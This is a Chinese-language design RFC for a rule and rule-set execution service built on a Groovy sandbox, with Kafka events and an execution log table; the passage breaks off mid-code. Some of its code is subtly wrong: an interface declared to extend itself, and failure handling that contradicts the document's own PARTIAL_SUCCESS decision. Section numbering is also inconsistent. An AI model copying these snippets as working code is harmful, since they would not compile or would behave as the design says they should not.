# RFC-0040: 规则执行服务（Rule/RuleSet Execution Service）

> **状态**：DRAFT · **优先级**：P0 · **预计工作量**：10d · **阶段**：S5
> **关联 RFC**：[RFC-0020 Groovy 沙箱 + 单条规则执行器](RFC-0020-Groovy沙箱单条规则执行器.md)、[RFC-0021 批量规则执行 + RuleSetArtifact](RFC-0021-批量规则执行RuleSetArtifact.md)、[RFC-0033 元数据管理 2 — RuleSetType 与 RuleType](RFC-0033-元数据管理2-RuleSetType与RuleType.md)、[RFC-0027 可观测性](RFC-0027-可观测性日志TraceActuator.md)

---

## 1. 摘要

设计并实现 `rule-execution-service`：作为 orule 平台对外提供规则执行的统一入口，对内承接 RFC-0020（单条规则 Groovy 沙箱）与 RFC-0021（规则集批量执行）。

- **同步入口**：`POST /api/v1/rule-executions`（单条规则，结果立即返回 + taskId）
- **异步入口**：`POST /api/v1/rule-set-executions`（规则集，立即返回 taskId，后台异步执行）
- **异步查询**：`GET  /api/v1/rule-set-executions/{taskId}`（查询规则集执行结果）
- **日志查询**：`GET  /api/v1/executions/{taskId}/logs`（查询执行详细日志）

执行结果统一落 `execution_log` 表，并发完成事件通过 Kafka 通知上游。

---

## 2. 动机

- **当前缺口**：RFC-0020 / RFC-0021 仅定义"执行器内部行为"，缺少对外 HTTP 契约、Feign 客户端抽象、执行日志持久化、异步结果查询接口。
- **业务诉求**：CustomerService 等上游业务需要统一入口，避免每个业务方各自实现"调用 Feign → 包装结果 → 落库"逻辑。
- **可观测需求**：所有规则执行必须留痕（taskId、耗时、输入输出 context、错误信息），便于审计与排障（依据 RFC-0027）。

---

## 3. 详细设计

### 3.1 模块位置

> **注意（RFC-0040 v0.6 修订）**：本服务复用现有 `packages/orule-runtime` 模块（v0.6 起改名 `packages/orule-rule-execution-service`），不创建新模块。Spring Boot 入口类同步从 `OruleRuntimeApplication` 改为 `RuleExecutionServiceApplication`，Java 包从 `com.orule.runtime` 改为 `com.orule.rule.execution`。

```
packages/orule-rule-execution-service/
├── src/main/java/com/orule/rule/execution/
│   ├── RuleExecutionServiceApplication.java  # Spring Boot 入口（v0.6 之前为 OruleRuntimeApplication）
│   ├── api/                                  # Controller 层
│   │   ├── RuleExecutionController.java
│   │   ├── RuleSetExecutionController.java
│   │   └── ExecutionLogController.java
│   ├── service/                              # Service 层
│   │   ├── RuleExecutorService.java
│   │   ├── RuleSetExecutorService.java
│   │   └── ExecutionLogService.java
│   ├── execution/                            # 执行引擎（包装 RFC-0020/0021）
│   │   ├── RuleExecutor.java                # SPI 接口
│   │   ├── RuleSetExecutor.java              # SPI 接口
│   │   ├── ExecutorRegistry.java
│   │   ├── java/                             # 默认实现（Groovy 沙箱）
│   │   │   ├── JavaSourceExecutor.java
│   │   │   └── GroovyShellFactory.java
│   │   └── python/                           # 扩展样例（GraalVM）
│   │       └── PythonExecutor.java
│   ├── async/                                # 异步调度
│   │   ├── AsyncTaskDispatcher.java
│   │   └── ThreadPoolConfig.java
│   ├── client/                               # Feign 客户端
│   │   └── RuleManagermentApiClient.java
│   ├── persistence/                          # 日志持久化
│   │   ├── ExecutionLog.java                 # JPA Entity
│   │   ├── ExecutionLogRepository.java
│   │   └── ExecutionLogStatus.java
│   ├── kafka/                                # 事件发布
│   │   └── ExecutionEventProducer.java
│   ├── model/                                # DTO
│   │   ├── ExecutionInput.java
│   │   ├── ExecutionOutput.java
│   │   ├── RuleExecutionRequest.java
│   │   ├── RuleExecutionResponse.java
│   │   ├── RuleSetExecutionRequest.java
│   │   ├── RuleSetExecutionSubmitResponse.java
│   │   └── RuleSetExecutionResultResponse.java
│   └── error/
│       ├── RuleNotFoundException.java
│       ├── RuleSetNotFoundException.java
│       ├── ExecutorNotFoundException.java
│       └── TaskNotFoundException.java
└── src/main/resources/
    ├── application.yml
    └── db/migration/
        └── V1__create_execution_log.sql
```

### 3.2 类总览（Component Diagram）

```
                              ┌────────────────────────────┐
                              │    External (Feign)         │
                              │  rule-management-service    │
                              │                             │
                              │  - GET /rules/{code}        │
                              │  - GET /rule-sets/{code}    │
                              │  - GET /rule-types/{code}   │
                              │  - GET /rule-set-types/{..} │
                              └────────────┬───────────────┘
                                           │
                  ┌────────────────────────┼────────────────────────┐
                  │                        │                        │
                  ▼                        ▼                        ▼
      ┌───────────────────┐   ┌────────────────────────┐  ┌─────────────────────────┐
      │ RuleManagerment   │   │ ExecutionLogRepository │  │ AsyncTaskDispatcher     │
      │ ApiClient (Feign) │   │ (本服务 JPA)             │  │ (Spring @Async)         │
      └─────────┬─────────┘   └────────────┬───────────┘  └─────────────────────────┘
                │                          │
                │                          │
       ┌────────┴──────────────────────────┴──────────────────────────────┐
       │                                                                    │
       │     ┌──────────────────────────┐                                  │
       │     │  Service 层                │                                  │
       │     │  RuleExecutorService     │                                  │
       │     │  RuleSetExecutorService  │                                  │
       │     │  ExecutionLogService     │                                  │
       │     └────────────┬─────────────┘                                  │
       │                  │                                                │
       │                  ▼                                                │
       │     ┌──────────────────────────┐                                  │
       │     │  Execution 层              │                                  │
       │     │  RuleExecutor (sync)      │                                  │
       │     │  RuleSetExecutor (async)  │                                  │
       │     └────────────┬─────────────┘                                  │
       │                  │                                                │
       │                  ▼                                                │
       │     ┌──────────────────────────┐                                  │
       │     │  ExecutorRegistry         │                                  │
       │     │  (插件机制 SPI)            │                                  │
       │     └────────────┬─────────────┘                                  │
       │                  │                                                │
       │     ┌────────────┴──────────────┐                                 │
       │     │                           │                                 │
       │     ▼                           ▼                                 │
       │ ┌─────────────────────┐  ┌──────────────────┐                   │
       │ │ JavaSourceExecutor  │  │ PythonExecutor    │                   │
       │ │ (默认, GroovyShell)  │  │ (扩展样例, GraalVM)│                   │
       │ └─────────────────────┘  └──────────────────┘                   │
       │                                                                  │
       │   ┌──────────────────────────┐                                   │
       └──▶│  RuleExecutionController │                                   │
           │  RuleSetExecController   │                                   │
           │  ExecutionLogController  │                                   │
           └────────────┬─────────────┘                                   │
                        │                                                 │
                        ▼                                                 │
           ┌──────────────────────────┐                                   │
           │  ExecutionEventProducer  │                                   │
           │  (Kafka)                  │                                   │
           └──────────────────────────┘                                   │
                        │                                                 │
                        ▼                                                 │
           ┌──────────────────────────┐                                   │
           │  topic: rule-set-execution-completed                        │
           └──────────────────────────┘                                   │
```

### 3.3 数据模型（execution_log 表）

```sql
CREATE TABLE execution_log (
    id              BIGINT PRIMARY KEY AUTO_INCREMENT,
    task_id         VARCHAR(64) NOT NULL UNIQUE,    -- 任务 ID（UUID）
    execution_type  VARCHAR(16) NOT NULL,            -- RULE / RULE_SET
    rule_code       VARCHAR(128),                    -- 关联 RuleType.programCode
    rule_set_code   VARCHAR(128),                    -- 关联 RuleSetType.programCode
    executor_type   VARCHAR(64) NOT NULL,            -- 使用的执行器标识
    status          VARCHAR(16) NOT NULL,            -- PENDING / RUNNING / SUCCESS / FAILED / PARTIAL_SUCCESS
    input_context   JSON,                            -- 输入 ObjectInst
    output_context  JSON,                            -- 输出 ObjectInst（含变更）
    total_count     INT,                             -- 仅 RULE_SET
    success_count   INT,
    failed_count    INT,
    error_code      VARCHAR(64),
    error_message   TEXT,
    trace_id        VARCHAR(64),
    operator_id     VARCHAR(64),                     -- 来自 JWT
    tenant_id       VARCHAR(64),                     -- 多租户
    started_at      DATETIME(3),
    finished_at     DATETIME(3),
    duration_ms     BIGINT,
    created_at      DATETIME(3) DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_exec_task ON execution_log(task_id);
CREATE INDEX idx_exec_rule_code ON execution_log(rule_code);
CREATE INDEX idx_exec_rule_set_code ON execution_log(rule_set_code);
CREATE INDEX idx_exec_created ON execution_log(created_at);
```

### 3.4 DTO 模型（接口契约）

```java
// === 外部请求 / 响应 ===

// RuleExecutionRequest（外部调用方传入）
public record RuleExecutionRequest(
    String ruleCode,                         // RuleType.programCode
    Map<String, ObjectInst> context          // 输入上下文（ObjectInst 集合）
) {}

// RuleExecutionResponse（同步返回）
public record RuleExecutionResponse(
    String taskId,
    boolean success,
    Map<String, ObjectInst> outputContext,
    Instant executedAt,
    long durationMs,
    String errorCode,
    String errorMessage
) {}

// RuleSetExecutionRequest
public record RuleSetExecutionRequest(
    String ruleSetCode,                      // RuleSetType.programCode
    Map<String, ObjectInst> context
) {}

// RuleSetExecutionSubmitResponse（异步立即返回）
public record RuleSetExecutionSubmitResponse(
    String taskId,
    String status    // PENDING
) {}

// RuleSetExecutionResultResponse（GET 异步结果）
public record RuleSetExecutionResultResponse(
    String taskId,
    String status,                           // PENDING / RUNNING / SUCCESS / FAILED / PARTIAL_SUCCESS
    Instant startedAt,
    Instant finishedAt,
    Long durationMs,
    Integer totalCount,
    Integer successCount,
    Integer failedCount,
    Map<String, ObjectInst> outputContext,   // RuleSet 汇总后的最终 context
    String errorMessage
) {}

// === 内部传递 ===

// ExecutionInput（Service -> Executor）
public record ExecutionInput(
    String executorType,                      // 执行器标识
    String sourceCode,                        // SimpleTS → Java 源码字符串
    Map<String, ObjectInst> context,
    ExecutionMetadata metadata                // 来自 rule-management-service
) {}

// ExecutionOutput（Executor -> Service）
public record ExecutionOutput(
    Map<String, ObjectInst> context,         // 累积变更后的 context
    boolean success,
    String errorCode,
    String errorMessage
) {}
```

### 3.5 接口汇总

| 方法 | 路径 | 同步 / 异步 | 说明 |
|------|------|-------------|------|
| POST | `/api/v1/rule-executions` | 同步 | 执行单条规则，返回结果 + taskId |
| POST | `/api/v1/rule-set-executions` | 异步提交 | 立即返回 taskId |
| GET | `/api/v1/rule-set-executions/{taskId}` | 同步查询 | 查询规则集执行结果 |
| GET | `/api/v1/executions/{taskId}/logs` | 同步查询 | 查询执行详细日志 |

> **设计意图**：`/rule-set-executions/{taskId}` 关注"结果汇总"，`/executions/{taskId}/logs` 关注"详细日志"。前者轻量用于轮询，后者完整含原始 input/output context 用于审计。

### 3.6 Service 层接口

```java
public interface RuleExecutorService {
    RuleExecutionResponse execute(RuleExecutionRequest request);
}

public interface RuleSetExecutorService {
    RuleSetExecutionSubmitResponse submit(RuleSetExecutionRequest request);
    RuleSetExecutionResultResponse queryResult(String taskId);
}

public interface ExecutionLogService {
    ExecutionLogDetail findByTaskId(String taskId);
}
```

### 3.7 执行层（插件机制 SPI）

```java
// SPI 接口
public interface RuleExecutor extends RuleExecutor {}

// ExecutorRegistry - 启动期扫描 META-INF/services
public class ExecutorRegistry {
    private final Map<String, RuleExecutor> ruleExecutors = new ConcurrentHashMap<>();
    private final Map<String, RuleSetExecutor> ruleSetExecutors = new ConcurrentHashMap<>();

    public void register(RuleExecutor executor) {
        ruleExecutors.put(executor.executorType(), executor);
    }

    public RuleExecutor resolve(String type) {
        RuleExecutor e = ruleExecutors.get(type);
        if (e == null) throw new ExecutorNotFoundException(type);
        return e;
    }
}
```

**注册方式**（`META-INF/services/com.orule.rule.execution.execution.RuleExecutor`）：
```
com.orule.rule.execution.execution.java.JavaSourceExecutor
com.orule.rule.execution.execution.python.PythonExecutor
```

### 3.8 时序图 1：同步执行单条规则

```
CustomerService     RuleExecCtrl    RuleExecutorSvc    RuleMgrApiClient    ExecutorRegistry    JavaSourceExecutor    ExecutionLogSvc    DB(execution_log)
     │                  │                │                    │                    │                    │                    │               │
     │ POST /rule-executions             │                    │                    │                    │                    │               │
     │ {ruleCode, context}               │                    │                    │                    │                    │               │
     │───────────────────▶│              │                    │                    │                    │                    │               │
     │                  │ execute(req)  │                    │                    │                    │                    │               │
     │                  │───────────────▶│                    │                    │                    │                    │               │
     │                  │                │ getRule(ruleCode) │                    │                    │                    │               │
     │                  │                │ [Feign: GET /rules/{code}]              │                    │                    │               │
     │                  │                │───────────────────▶│                    │                    │                    │               │
     │                  │                │◀─ RuleArtifact ───│                    │                    │                    │               │
     │                  │                │  (含 executorType, sourceCode)         │                    │                    │               │
     │                  │                │ resolve(executorType)                  │                    │                    │               │
     │                  │                │───────────────────────────────────────▶│                    │                    │               │
     │                  │                │◀── JavaSourceExecutor ───────────────│                    │                    │               │
     │                  │                │ execute(ExecutionInput)               │                    │                    │               │
     │                  │                │─────────────────────────────────────────────────────▶│                    │               │
     │                  │                │                    │   1. GroovyShell 编译 Java 源码       │                    │               │
     │                  │                │                    │   2. 注入 context 参数                │                    │               │
     │                  │                │                    │   3. 反射调用 main(), 收集 outputContext │                    │               │
     │                  │                │◀─────── ExecutionOutput (含新 order.discount=30) ───│                    │               │
     │                  │                │ save(taskId, status=SUCCESS, outputContext, durationMs)                  │               │
     │                  │                │───────────────────────────────────────────────────────────────────▶│               │
     │                  │                │                    │                    │                    │                    │ INSERT     │
     │                  │                │◀── RuleExecutionResponse ─────────────────────────────────────────────────────────────│
     │◀────────────────│◀──────────────│  {taskId, success, outputContext, durationMs}                       │               │
```

**JavaSourceExecutor 核心逻辑**（包装 RFC-0020）：

```java
public class JavaSourceExecutor implements RuleExecutor {

    private final GroovyShellFactory shellFactory;

    @Override
    public String executorType() { return "java-source"; }

    @Override
    public ExecutionOutput execute(ExecutionInput input) {
        String javaSource = wrapAsJavaMainMethod(input.sourceCode(), input.context());

        GroovyShell shell = shellFactory.create();
        Script script;
        try {
            script = shell.parse(javaSource);
            input.context().forEach((k, v) -> script.setProperty(k, toJavaObject(v)));
            script.run();
        } catch (CompilationFailedException | RuntimeException e) {
            throw new RuleExecutionException("EVAL_FAILED", e.getMessage(), e);
        }

        Map<String, ObjectInst> output = extractContextFromScript(script);
        return new ExecutionOutput(output, true, null, null);
    }

    private String wrapAsJavaMainMethod(String ruleBody, Map<String, ObjectInst> ctx) {
        return SourceTemplate.wrap("RuleScript", ctx.keySet(), ruleBody);
    }
}
```

### 3.9 时序图 2：异步执行规则集

```
CustomerService    RSExecCtrl    RSExecutorSvc    RuleMgrApiClient    ExecutionLogSvc    AsyncTaskDisp    RSExecutor(后台)    RuleExecutor    Kafka
     │                │              │                  │                    │                │                │                │             │
     │ POST /rule-set-executions     │                  │                    │                │                │                │             │
     │ {ruleSetCode, context}        │                  │                    │                │                │                │             │
     │───────────────▶│              │                  │                    │                │                │                │             │
     │                │ submit(req)  │                  │                    │                │                │                │             │
     │                │─────────────▶│                  │                    │                │                │                │             │
     │                │              │ getRuleSetArtifact(ruleSetCode)        │                │                │                │             │
     │                │              │ [Feign: GET /rule-sets/{code}]         │                │                │                │             │
     │                │              │──────────────────▶│                    │                │                │                │             │
     │                │              │◀── RuleSetArtifact ─│                  │                │                │                │             │
     │                │              │  (含 rules: List<RuleRef>, executorType)               │                │                │             │
     │                │              │ save(taskId, status=PENDING, totalCount=3)            │                │                │             │
     │                │              │─────────────────────────────────────▶│                │                │                │             │
     │                │              │ dispatch(taskId, executionContext)  │                │                │                │             │
     │                │              │─────────────────────────────────────│                │                │                │             │
     │                │              │ RuleSetExecutionSubmitResponse      │   @Async       │                │                │             │
     │                │◀─────────────│ {taskId, status=PENDING}            │──────────────▶│                │                │             │
     │◀──────────────│              │                  │                    │                │ run(taskId)    │                │             │
     │                │              │                  │                    │                │───────────────▶│                │             │
     │                │              │                  │                    │                │ 遍历 rules:    │                │             │
     │                │              │                  │                    │                │  [1] VIP折扣    │                │             │
     │                │              │                  │                    │                │ execute(rule1) │                │             │
     │                │              │                  │                    │                │───────────────────────────────▶│             │
     │                │              │                  │                    │                │                │ ◀── output1 ───│             │
     │                │              │                  │                    │                │  context 累积   │                │             │
     │                │              │                  │                    │                │  [2] 满减      │                │             │
     │                │              │                  │                    │                │ execute(rule2) │                │             │
     │                │              │                  │                    │                │───────────────────────────────▶│             │
     │                │              │                  │                    │                │                │ ◀── output2 ───│             │
     │                │              │                  │                    │                │  [3] 运费      │                │             │
     │                │              │                  │                    │                │ execute(rule3) │                │             │
     │                │              │                  │                    │                │───────────────────────────────▶│             │
     │                │              │                  │                    │                │                │ ◀── output3 ───│             │
     │                │              │                  │                    │                │ updateLog(taskId, status=SUCCESS, successCount=3, outputContext)│
     │                │              │                  │                    │   send event {taskId, status=SUCCESS, ...}                │
     │                │              │                  │                    │                │                │ ─────────────────────────────▶│
     │                │              │                  │                    │                │                │                │ topic: rule-set-execution-completed
```

### 3.10 时序图 3：查询异步结果

```
CustomerService     RSExecCtrl      RSExecutorSvc     DB(execution_log)
     │                  │                  │                  │
     │ GET /rule-set-executions/{taskId}   │                  │
     │───────────────────▶                  │                  │
     │                  │ queryResult(taskId)                │
     │                  │─────────────────▶│                  │
     │                  │                  │ SELECT * WHERE task_id = ? │
     │                  │                  │─────────────────▶│
     │                  │                  │◀──── ExecutionLog ──│
     │                  │◀── RuleSetExecutionResultResponse ───│
     │◀────────────────│  {taskId, status, totalCount, successCount, outputContext} │
```

### 3.11 Service 实现

```java
@Service
public class DefaultRuleSetExecutorService implements RuleSetExecutorService {

    @Override
    @Transactional
    public RuleSetExecutionSubmitResponse submit(RuleSetExecutionRequest req) {
        RuleSetArtifact artifact = ruleMgrClient.getRuleSetArtifact(req.ruleSetCode());
        if (artifact == null) throw new RuleSetNotFoundException(req.ruleSetCode());

        String taskId = UUID.randomUUID().toString();
        int total = artifact.rules().size();
        ExecutionLog log = ExecutionLog.pending(taskId, RULE_SET, req.ruleSetCode(),
            artifact.executorType(), req.context(), total);
        executionLogRepository.save(log);

        taskDispatcher.dispatch(taskId, req, artifact);

        return new RuleSetExecutionSubmitResponse(taskId, "PENDING");
    }

    @Override
    public RuleSetExecutionResultResponse queryResult(String taskId) {
        ExecutionLog log = executionLogRepository.findByTaskId(taskId)
            .orElseThrow(() -> new TaskNotFoundException(taskId));
        return RuleSetExecutionResultResponse.from(log);
    }
}
```

### 3.12 RuleSetExecutor 后台 Worker

```java
@Component
public class DefaultRuleSetExecutor implements RuleSetExecutor {

    @Override
    @Async("ruleSetExecutorPool")
    public void run(String taskId, RuleSetExecutionRequest req, RuleSetArtifact artifact) {
        ExecutionLog log = executionLogRepository.findByTaskId(taskId).orElseThrow();
        log.markRunning();
        executionLogRepository.save(log);

        Map<String, ObjectInst> context = req.context();
        int success = 0, failed = 0;
        String errorMsg = null;

        try {
            for (RuleRef ref : artifact.rules()) {
                RuleArtifact rule = ruleMgrClient.getRule(ref.ruleCode());
                RuleExecutor executor = executorRegistry.resolve(rule.executorType());

                ExecutionInput input = new ExecutionInput(
                    rule.executorType(), rule.sourceCode(), context, rule.metadata());
                ExecutionOutput output = executor.execute(input);
                context = output.context();
                success++;
            }
            log.markSuccess(context, success, failed);
        } catch (Exception e) {
            failed = artifact.rules().size() - success;
            errorMsg = e.getMessage();
            log.markFailed(errorMsg, success, failed);
        }
        executionLogRepository.save(log);

        kafkaTemplate.send("rule-set-execution-completed",
            new RuleSetExecutionCompletedEvent(taskId, log.status(),
                log.totalCount(), success, failed, log.durationMs()));
    }
}
```

### 3.13 错误处理

| 错误场景 | 处理策略 | HTTP / 错误码 |
|---------|---------|--------------|
| `ruleCode` 不存在 | Feign 404 → 抛 RuleNotFoundException | 404 / `RULE_NOT_FOUND` |
| `ruleSetCode` 不存在 | 同上 | 404 / `RULE_SET_NOT_FOUND` |
| ExecutorType 未注册 | ExecutorRegistry 抛 ExecutorNotFoundException | 500 / `EXECUTOR_NOT_REGISTERED` |
| 规则代码编译失败 | GroovyShell 抛 CompilationFailedException | 200 / `success=false, errorCode=EVAL_FAILED` |
| 规则运行时异常 | catch RuntimeException，记录日志 | 200 / `success=false, errorCode=RUNTIME_ERROR` |
| RuleSet 部分规则失败 | 继续执行剩余规则，标记 failedCount | taskId 完成事件 status=PARTIAL_SUCCESS |
| 异步任务超时 | Spring @Async 配置超时 → 标记 FAILED | Kafka 事件 status=FAILED |

---

## 4. 技术决策（ADR）

### ADR-001：执行引擎选择 — GroovyShell vs GraalVM

**决策**：默认 JavaSourceExecutor 使用 GroovyShell，预留 GraalVM 扩展点（PythonExecutor 样例实现）。

| 维度 | GroovyShell ✅ | GraalVM |
|------|---------------|---------|
| 启动延迟 | <10ms | 200-500ms |
| 资源占用 | 共享 JVM | 独立 isolate |
| 安全沙箱 | SecureASTCustomizer 限制 import/receiver | native-image 隔离（强） |
| 内存隔离 | ❌ 共享进程 | ✅ TruffleLanguage 隔离 |
| 多语言 | 仅 Java/Groovy | Python/JS/Ruby |

**风险与缓解**：
- 共享 JVM 内存 → GroovyClassLoader 隔离 + SecureASTCustomizer 黑名单 `Runtime/Process/Reflection`
- 反射逃逸 → 默认禁用 `Method.invoke`，需要时由执行器显式启用
- 性能 → 类缓存：`GroovyShell.parse()` 编译结果按 `sourceCodeHash` 缓存，下次直接复用

### ADR-002：Rule/RuleSet 接口分离

**决策**：分离接口（`RuleExecutor` / `RuleSetExecutor`），通过 `ExecutorRegistry` 各自注册。

**理由**：
- 同步 vs 异步语义不同
- 元数据形状不同
- 错误处理粒度不同

### ADR-003：执行日志存储 — 单表 vs 分表

**决策**：单表 `execution_log`，通过 `execution_type` 字段区分。

**风险与缓解**：
- 表膨胀 → 按月分区（PARTITION BY RANGE），3 个月前数据归档到冷库
- 高写入延迟 → JSON 字段（input_context/output_context）考虑压缩存储或外链对象存储

### ADR-004：异步执行模型 — 进程内 @Async vs 消息队列

**决策**：默认 Spring `@Async`（进程内线程池），预留 MQ 扩展。

**演进路径**：
- v1：Spring @Async + 进程内 ThreadPoolTaskExecutor
- v2：引入 Kafka + 持久化任务表（重启后恢复）

### ADR-005：Feign 客户端命名

**决策**：使用 `RuleManagermentApiClient`（保留用户指定拼写）。

> ℹ️ 拼写问题建议在 PR 描述中说明（如需后续纠正为 `RuleManagement`，可发起单独 RFC）。

---

## 5. 风险登记

| 风险 ID | 风险描述 | 影响 | 缓解措施 | 负责人 |
|---------|---------|------|---------|--------|
| R-001 | GroovyShell 安全沙箱被绕过 | 高 | SecureASTCustomizer 黑名单 + GroovyClassLoader 隔离 + 单测覆盖 OWASP Top 10 | 后端 |
| R-002 | 规则代码死循环/长耗时阻塞线程池 | 高 | 单规则执行超时（默认 5s）+ ThreadPoolTaskExecutor 拒绝策略 + 熔断 | 后端 |
| R-003 | execution_log 表膨胀导致查询慢 | 中 | 月分区 + 冷数据归档 OSS + 历史日志查询走 ES | DBA / 后端 |
| R-004 | 异步任务进程崩溃丢失 | 中（v1）→ 低（v2） | v1 接受丢失；v2 引入持久化任务表 + Kafka | 架构 |
| R-005 | RuleSet 部分规则失败语义模糊 | 中 | 明确定义 `PARTIAL_SUCCESS` 状态 + failedCount 字段 + Kafka 事件含详情 | 后端 |
| R-006 | Feign 调用超时导致用户体验差 | 中 | Feign 配置 2s 超时 + 熔断降级（返回默认值） | 后端 |
| R-007 | SimpleTS 解析失败导致无法生成 Java 源码 | 高 | 在 RuleArtifact 保存前校验 + 执行器增加兜底异常 | 前端 / 后端 |
| R-008 | GroovyShell 类缓存导致 OOM | 中 | LRU 缓存（最大 1000 条）+ 定期清理 | 后端 |
| R-009 | ObjectInst 深拷贝/浅拷贝语义 | 中 | 执行器内部统一深拷贝 context，避免规则代码污染输入 | 后端 |
| R-010 | 同步规则阻塞 HTTP 线程 | 中 | Servlet 容器使用异步 Servlet + 独立线程池隔离 | 后端 |

---

## 6. 容量与性能预估

| 维度 | 估算 | 说明 |
|------|------|------|
| 单规则执行耗时 | P50=20ms / P99=200ms | 含 Feign + GroovyShell 编译 + 执行 |
| 单规则集执行耗时 | P50=300ms / P99=3s（10 条规则） | 10 条规则线性叠加 |
| 日志写入 TPS | 100-500/s | 单条规则同步写 |
| 日志存储 | 每天 ~50 万条 / 30GB JSON | 按月归档 |
| ThreadPool 大小 | core=20, max=50, queue=500 | 异步规则集执行 |
| 线程池队列满策略 | CallerRunsPolicy | 防止任务丢失 |

---

## 7. 可观测性（依据 RFC-0027）

### 7.1 Micrometer 指标

```java
Timer.builder("rule.execution.duration")
    .tag("rule_code", ruleCode)
    .tag("executor_type", executorType)
    .tag("status", status)
    .publishPercentileHistogram()
    .register(meterRegistry);

Counter.builder("rule_set.execution.count")
    .tag("rule_set_code", ruleSetCode)
    .tag("status", status)
    .register(meterRegistry);

Gauge.builder("rule_set.async.queue.size", taskDispatcher, d -> d.queueSize())
    .register(meterRegistry);
```

### 7.2 Trace 透传

```java
@Observed(name = "rule.execute")
public ExecutionOutput execute(ExecutionInput input) {
    Span span = tracer.currentSpan();
    span.tag("rule.code", input.metadata().ruleCode());
    span.tag("executor.type", input.executorType());
}
```

### 7.3 关键日志

```java
log.info("Rule execution completed: taskId={}, ruleCode={}, durationMs={}, status={}",
    taskId, ruleCode, durationMs, status);
log.warn("Rule execution partial failure: taskId={}, ruleSetCode={}, successCount={}, failedCount={}",
    taskId, ruleSetCode, successCount, failedCount);
log.error("Rule execution failed: taskId={}, ruleCode={}, errorCode={}, errorMessage={}",
    taskId, ruleCode, errorCode, errorMessage, throwable);
```

---

## 8. 安全考虑

1. **多租户隔离**：
   - RuleArtifact 增加 `tenantId` 字段，Feign 客户端透传 `X-Tenant-Id` 头
   - 执行器沙箱不感知租户，由上游 Service 层保证

2. **数据脱敏**：
   - 日志中 customer/order 字段可能含敏感信息（PII）
   - 日志落盘前调用 `MaskingService.mask(context)`，身份证/手机号脱敏

3. **审计追踪**：
   - execution_log 表记录 `operator_id`（来自 JWT）
   - Kafka 完成事件含 `operator_id`，便于审计

4. **限流**：
   - 按 `ruleCode` 维度限流（Guava RateLimiter）：防止单条规则被恶意刷爆
   - 按租户维度限流：默认 100 TPS/租户

---

## 9. 测试策略（验收标准）

| 测试类别 | 范围 | 验收门槛 |
|---------|------|---------|
| 单元测试 | RuleExecutor / RuleSetExecutor / Service | 行覆盖 ≥ 80% |
| 集成测试 | Controller + Service + Repository | 关键路径 100% |
| 沙箱安全测试 | GroovyShell 沙箱边界 | OWASP Top 10 攻击向量全部拦截 |
| 性能测试 | 单规则/规则集 P99 耗时 | P99 < 200ms（单规则）/ 3s（10 条规则集） |
| E2E 测试 | CustomerService 真实调用 → 订单折扣场景 | 折扣计算结果与预期一致 |

---

## 10. 后续演进（Roadmap）

| 阶段 | 内容 | 时间 |
|------|------|------|
| v1.0 | RuleExecutor + RuleSetExecutor（GroovyShell）+ 日志表 + 查询接口 | MVP |
| v1.1 | PythonExecutor（GraalVM）扩展样例 | +2 周 |
| v1.2 | 异步任务持久化（任务表 + Kafka 重试） | +1 月 |
| v2.0 | 执行历史分析（ES 聚合：成功率、平均耗时、热点规则） | +2 月 |
| v2.1 | 规则执行预热（RuleArtifact 启动期编译并缓存） | +3 月 |
| v3.0 | 多 Region 部署 + 全局任务调度 | +6 月 |

---

## 11. 开放问题

| # | 问题 | 决策 | 影响范围 |
|---|------|------|---------|
| Q1 | RuleSet 部分失败时，是否回滚前面规则对 context 的修改？ | **✅ 默认不回滚**（业务方感知失败后自行补偿） | §3.12 后台 worker；§3.13 错误处理 |
| Q2 | ObjectInst 修改是直接覆盖属性还是返回新的 ObjectInst？ | **✅ 默认覆盖属性**（兼容 SimpleTS 语义） | §3.4 `ExecutionOutput.context`；§3.12 `context = output.context()` |
| Q3 | GroovyShell 类缓存是否持久化到 Redis？ | **✅ v1 进程内 LRU**（v2 评估 Redis） | §3.12 ADR-001 性能优化；§6 容量预估 |
| Q4 | RuleExecutor 和 RuleSetExecutor 是否要共用 service 抽象层？ | **✅ 当前分离**，v2 抽象出 AbstractExecutor | §3.7 SPI 接口；ADR-002 |

> **决策记录**：上述 4 个问题于 2026-09-13 由 RFC-0040 评审会确认，详见 §12 决策落地说明。

---

## 12. 决策落地说明（Q1~Q4 实现细节）

本节针对 §11 中已确认的 4 个决策，补充具体实现约束与代码细节。

### 13.1 Q1：RuleSet 部分失败不回滚

**决策**：规则集中任意一条规则执行失败，**已经成功执行的规则对 context 的修改将保留**，不进行事务回滚。

**实现约束**：

```java
// §3.12 DefaultRuleSetExecutor.run() — 失败后状态标记
} catch (Exception e) {
    failed = artifact.rules().size() - success;
    errorMsg = e.getMessage();
    // ✅ 不回滚 context，保留已成功执行的累积变更
    // ✅ status 标记为 PARTIAL_SUCCESS（区分全成功 SUCCESS）
    log.markPartialSuccess(context, success, failed, errorMsg);
}
```

**业务侧补偿契约**：
- Kafka 事件 `rule-set-execution-completed` 中 `status=PARTIAL_SUCCESS`，业务方可订阅事件触发补偿
- `GET /api/v1/rule-set-executions/{taskId}` 返回的 `outputContext` 是**部分执行后的中间状态**，业务方应结合 `successCount` / `failedCount` 判断是否可用
- 日志表 `execution_log.output_context` 持久化部分结果，便于事后排查

**测试要求**：
- 规则集 3 条规则中第 2 条失败 → 断言 `successCount=1, failedCount=1, outputContext` 含规则 1 的修改

### 13.2 Q2：ObjectInst 覆盖属性（深拷贝 + 原址修改）

**决策**：执行器对 context 中 ObjectInst 的修改采用**原址修改**（in-place mutation），但执行器内部必须**先深拷贝输入 context**，避免污染上游调用方。

**实现约束**：

```java
// ExecutionInput 构造：调用方先深拷贝 context
ExecutionInput input = new ExecutionInput(
    rule.executorType(),
    rule.sourceCode(),
    deepCopyContext(req.context()),     // ✅ 深拷贝入口 context
    rule.metadata()
);

// JavaSourceExecutor 内部：从 GroovyShell 反射读出的 ObjectInst 共享副本内存
// 修改副本不影响原始对象（Groovy setProperty 操作的是脚本局部引用副本）
ExecutionOutput output = new ExecutionOutput(
    deepCopyContext(scriptContext),     // ✅ 输出时再深拷贝一次，保证调用方拿到的也是独立副本
    true, null, null
);
```

**深拷贝实现**：

```java
public class ObjectInstDeepCopier {
    public static Map<String, ObjectInst> copy(Map<String, ObjectInst> ctx) {
        Map<String, ObjectInst> copy = new HashMap<>(ctx.size());
        ctx.forEach((k, v) -> copy.put(k, deepCopy(v)));
        return copy;
    }

    private static ObjectInst deepCopy(ObjectInst orig) {
        ObjectInst c = new ObjectInst(orig.typeCode());
        orig.attributes().forEach((k, v) -> c.setAttribute(k, copyValue(v)));
        return c;
    }

    private static Object copyValue(Object v) {
